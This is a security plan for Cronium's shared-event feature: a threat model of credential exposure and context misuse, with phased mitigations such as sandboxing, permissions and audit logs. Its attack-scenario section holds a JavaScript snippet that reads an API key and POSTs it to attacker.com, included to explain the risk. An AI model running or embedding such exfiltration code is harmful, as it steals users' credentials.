# Shared Event Security Plan

## Overview

This document outlines the security risks associated with shared events and workflows in Cronium, and proposes mitigation strategies. The current implementation allows users to share events, but these shared events execute with the original owner's context, creating significant security vulnerabilities.

## Current Implementation

### Sharing Model

- Events, workflows, and servers have a boolean `shared` field
- Shared resources can be viewed by any authenticated user
- Only the owner can edit or delete resources
- Shared events execute with the owner's context (variables, credentials, servers)

### Permission System

- **View**: Owner OR shared
- **Edit/Delete**: Owner only
- **Execute**: Anyone who can view

## Security Risks

### 1. Critical: Full Context Access

**Risk**: When User B executes User A's shared event, it runs with User A's full context

- Access to User A's variables via `cronium.getVariable()`
- Can modify User A's variables via `cronium.setVariable()`
- Access to User A's tool credentials (Slack, Discord, etc.)
- Executes on User A's configured servers with their SSH keys

**Attack Scenario**:

```javascript
// User A shares an innocent-looking event
console.log("Hello World");

// User B modifies their local copy to:
const apiKey = cronium.getVariable("OPENAI_API_KEY");
fetch("https://attacker.com/steal", {
  method: "POST",
  body: JSON.stringify({ apiKey }),
});
```

### 2. High: Credential Exposure

**Risk**: Tool credentials are fully accessible during shared event execution

- OAuth tokens for integrations
- API keys stored in variables
- SSH keys for server access
- Database credentials in environment variables

### 3. High: Resource Manipulation

**Risk**: Shared events can manipulate the owner's resources

- Create/modify/delete variables
- Trigger other private events via conditional actions
- Access and modify files on the owner's servers
- Send messages through the owner's integrations

### 4. Medium: Chain Execution Attacks

**Risk**: Shared events can trigger chains of private events

- onSuccess/onFailure actions execute in owner context
- No depth limiting on execution chains
- Can create loops or resource exhaustion

### 5. Medium: Information Disclosure

**Risk**: Shared events reveal sensitive information

- Server configurations and IP addresses
- Variable names and values
- Integration configurations
- File system structure on remote servers

## Proposed Mitigation Strategies

### Phase 1: Immediate Security Controls (Week 1-2)

#### 1.1 Execution Context Isolation

Create a separate execution context for shared events:

```typescript
interface SharedEventContext {
  // Limited variable access
  variables: {
    readonly: string[]; // Variables that can be read
    writable: string[]; // Variables that can be written
  };

  // No credential access by default
  credentials: {
    allowed: string[]; // Explicitly allowed credentials
  };

  // Restricted server access
  servers: {
    allowed: number[]; // Explicitly allowed server IDs
  };
}
```

#### 1.2 Variable Sandboxing

Implement variable access controls:

- Read-only variable access by default
- Explicit whitelist for writable variables
- Separate namespace for shared event variables
- Audit log for all variable access

#### 1.3 Credential Masking

Never expose credentials to shared event execution:

- Replace credentials with placeholders in shared context
- Owner must explicitly grant credential usage
- Implement credential-free execution mode

### Phase 2: Enhanced Permission System (Week 3-4)

#### 2.1 Granular Permissions

Replace boolean `shared` with permission levels:

```typescript
enum EventPermission {
  PRIVATE = "private",
  VIEW_ONLY = "view_only",
  EXECUTE_SANDBOXED = "execute_sandboxed",
  EXECUTE_WITH_CONTEXT = "execute_with_context",
}

interface EventSharing {
  permission: EventPermission;
  allowedUsers?: string[]; // Specific users instead of everyone
  allowedVariables?: {
    read: string[];
    write: string[];
  };
  allowedCredentials?: string[];
  allowedServers?: number[];
  expiresAt?: Date;
}
```

#### 2.2 Sharing Configuration UI

Create a sharing configuration interface:

- Visual permission selector
- Variable access configuration
- Credential usage permissions
- Server access permissions
- Expiration settings

### Phase 3: Audit and Monitoring (Week 5-6)

#### 3.1 Comprehensive Audit Logging

Log all shared event activities:

```typescript
interface SharedEventAudit {
  eventId: number;
  ownerId: string;
  executorId: string;
  timestamp: Date;
  action: "view" | "execute" | "fork";
  variablesAccessed: string[];
  credentialsUsed: string[];
  serversAccessed: number[];
  result: "success" | "failed" | "denied";
}
```

#### 3.2 Real-time Monitoring

- Dashboard for monitoring shared event usage
- Alerts for suspicious activity
- Rate limiting on shared event execution
- Automatic suspension of compromised events

### Phase 4: Advanced Security Features (Month 2)

#### 4.1 Event Signing and Verification

- Cryptographically sign shared events
- Prevent tampering with shared event code
- Verify integrity before execution

#### 4.2 Sandboxed Execution Environment

- Docker/LXC containers for shared event execution
- Resource limits (CPU, memory, network)
- Network isolation and firewall rules
- Temporary file system

#### 4.3 Fork Instead of Share

Alternative sharing model:

- Users fork events instead of executing shared ones
- Forked events run in the forker's context
- Original owner has no security exposure
- Track fork relationships for updates

## Implementation Priority

1. **Immediate** (Before any release):
   - Disable shared event execution OR
   - Implement basic variable sandboxing
   - Add warning dialogs about security risks

2. **Short-term** (2-4 weeks):
   - Granular permission system
   - Credential masking
   - Basic audit logging

3. **Medium-term** (1-2 months):
   - Full sandboxed execution
   - Comprehensive monitoring
   - Fork-based sharing

## Migration Strategy

Since the app hasn't been released:

1. Implement new security model directly
2. No backward compatibility needed
3. Design UI/UX with security-first approach
4. Extensive testing before any beta release

## Security Principles

1. **Principle of Least Privilege**: Shared events should have minimal access by default
2. **Explicit Grant**: All permissions must be explicitly granted by the owner
3. **Audit Everything**: Every action on shared resources must be logged
4. **Fail Secure**: When in doubt, deny access
5. **Defense in Depth**: Multiple layers of security controls

## Conclusion

The current shared event implementation poses significant security risks. Before any public release, we must implement at least Phase 1 controls. The recommended approach is to start with a fork-based model that eliminates most security concerns, then gradually add direct sharing with proper sandboxing and controls.
